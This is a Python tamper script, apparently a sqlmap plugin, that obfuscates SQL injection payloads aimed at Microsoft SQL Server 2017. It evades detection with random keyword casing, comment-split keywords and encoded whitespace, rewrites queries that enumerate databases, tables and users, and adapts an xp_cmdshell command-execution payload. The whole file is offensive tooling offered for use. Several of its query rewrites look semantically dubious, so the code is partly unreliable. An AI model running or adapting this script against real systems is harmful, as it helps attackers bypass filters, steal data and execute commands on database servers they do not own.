#!/usr/bin/env python

"""
@Project  : ByPassTamperPlus
@File     : mssql_2017_bypass.py
@Author   : Tas9er / https://www.github.com/Tas9er
@IDE      : PyCharm
"""

import re
import random
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHEST

def dependencies():
    pass

def general_obfuscate(payload):
    if not payload:
        return payload

    def case_folding(match):
        word = match.group(0)
        return "".join(c.upper() if random.getrandbits(1) else c.lower() for c in word)
    
    keywords = r"\b(SELECT|FROM|WHERE|AND|OR|UNION|INSERT|UPDATE|DELETE|DROP|EXEC|DECLARE|WAITFOR|DELAY|TOP|MATCH|NODE|EDGE|STRING_AGG|TRANSLATE|TRIM|SYS\.TABLES|SYS\.COLUMNS|INFORMATION_SCHEMA|COLUMNS|DB_NAME|USER_NAME|XP_CMDSHELL)\b"
    payload = re.sub(keywords, case_folding, payload, flags=re.IGNORECASE)

    payload = re.sub(r"(?i)\bLEN\(", "DATALENGTH(", payload)
    payload = re.sub(r"(?i)\bGETDATE\(\)", "SYSDATETIME()", payload)
    payload = re.sub(r"(?i)\bISNULL\(", "COALESCE(", payload)

    def comment_splitter(match):
        word = match.group(0)
        if len(word) > 3:
            pos = random.randint(1, len(word) - 1)
            return word[:pos] + "/*" + "".join(random.choice("abcdefghijklmnopqrstuvwxyz") for _ in range(3)) + "*/" + word[pos:]
        return word
    
    payload = re.sub(keywords, comment_splitter, payload, flags=re.IGNORECASE)

    def whitespace_replacer(match):
        choices = ["/**/", "%09", "%0a", "/**/ /*!*/ /**/"]
        return random.choice(choices)
    
    payload = re.sub(r"\s+", whitespace_replacer, payload)

    return payload

def tamper(payload, **kwargs):
    if not payload:
        return payload

    if "USER_NAME()" in payload.upper():
        payload = "CREATE TABLE #u (name NVARCHAR(100)) AS NODE; INSERT INTO #u VALUES (USER_NAME()); SELECT name FROM #u"

    if "sys.databases" in payload.lower():
        payload = payload.replace("name", "STRING_AGG(name, ',')")

    if "sys.tables" in payload.lower() and "sys.schemas" in payload.lower():
        payload = re.sub(r"(?i)SELECT\s+(.+)\s+FROM\s+sys.tables\s+t,\s+sys.schemas\s+s", r"SELECT t.\1 FROM sys.tables t, sys.schemas s WHERE MATCH(t-(REFERENCES)->s)", payload)

    if "name" in payload.lower():
        payload = payload.replace("name", "TRANSLATE(name, 'aeiou', '12345')")

    if "SELECT" in payload.upper():
        payload = re.sub(r"(?i)SELECT\s+(.+)\s+FROM", r"SELECT TRIM(\1) FROM", payload)

    if "xp_cmdshell" in payload.lower():
        payload = payload.replace("xp_cmdshell 'whoami'", "xp_cmdshell 'bash -c \"whoami\"'")

    payload = general_obfuscate(payload)

    return payload
